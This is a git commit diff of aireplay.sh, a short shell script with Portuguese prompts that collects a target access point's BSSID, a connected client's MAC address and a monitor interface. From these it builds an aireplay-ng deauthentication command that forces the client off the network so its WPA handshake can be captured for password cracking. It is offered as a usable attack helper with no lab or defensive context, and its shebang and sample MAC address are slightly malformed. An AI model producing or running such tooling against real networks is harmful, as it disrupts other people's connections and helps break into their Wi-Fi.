59de5ec5ef3be5b2ef3b356c7ada53af2d076f4e
m4n3qun1 <54857288+m4n3qun1@users.noreply.github.com>
2020-08-23 21:04:28 -0300

    Update aireplay.sh

--- aireplay.sh
+++ aireplay.sh
@@ -1,6 +1,6 @@
 #/bin/sh
-
-echo  "BSSID = (voce pode encontra-lo quando esta usando o airodump-ng)"
+echo 'execute a script varias vezes ate obter o handshake'
+echo  "BSSID = (voce pode encontra-lo quando esta usando o airodump-ng):"
 echo "MAC do client = (esse é o 'MAC do dispositivo conectado na rede' voce pode encontralo no canto esquerdo do lado do BSSID da rede exemplo tem 5 dispositvos na rede, apareceram 5 MAC diferente como esse 12:OL:JH:3D:87:0B)"
  
 echo "qual o BSSID?:"
@@ -12,4 +12,10 @@ read mc
 echo "como esta sua interface em modo monitor?:"
 read monitor
 
-aireplay-ng -0 1 -a $bssid  -c  $mc  $monitor
+echo "quantas tentativas voce deseja? (exemplo 30):"
+read threads
+
+echo 'digite esse comando para usar o aireplay de acordo com as definições que vc deu'
+echo
+echo
+echo aireplay-ng -0 $threads -a $bssid  -c  $mc  $monitor
